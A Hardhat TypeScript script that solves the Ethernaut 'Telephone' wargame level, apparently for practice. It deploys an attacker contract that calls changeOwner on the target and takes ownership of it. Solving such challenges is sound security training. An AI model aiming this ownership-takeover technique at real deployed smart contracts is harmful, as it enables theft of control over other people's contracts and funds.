import { fail } from "assert";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

async function telephoneExploit() {
  const telephoneAddress = process.env.TELEPHONE_ADDRESS || fail("Telephone address not found");
  const [attacker] = await ethers.getSigners();

  const telephone = await ethers.getContractAt("Telephone", telephoneAddress);
  const TelephoneHack = await ethers.getContractFactory("TelephoneHack");

  const telephoneHack = await TelephoneHack.connect(attacker).deploy(telephone.address);

  const tx = await telephoneHack.connect(attacker).changeOwner(attacker.address);

  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);

  await tx.wait();
  console.log(`SUCCESS!!! Submit the instance.`);
}

telephoneExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
